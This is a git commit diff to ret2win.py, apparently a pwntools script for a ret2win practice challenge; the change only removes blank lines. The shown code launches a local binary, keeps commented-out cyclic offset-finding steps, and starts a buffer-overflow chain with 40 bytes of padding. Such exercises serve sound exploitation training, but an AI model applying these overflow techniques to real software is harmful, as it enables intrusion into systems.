47a73d9fae92536599e899ce047bf999867d6b37
Tyler Dionne <143131384+tylerdionne@users.noreply.github.com>
2023-11-27 19:50:35 -0500

    Update ret2win.py

--- ret2win/ret2win.py
+++ ret2win/ret2win.py
@@ -10,20 +10,17 @@ gs = '''
 continue
 '''
 
-
 def start():
     if args.GDB:
         return gdb.debug(e.path, gdbscript=gs)
     else:
         return process(e.path)
 
-
 p = start()
 
 #x = cyclic(500)
 #p.sendline(x)
 #cyclic -l kaaa
-
 
 padding = b'A' * 40
 chain = padding
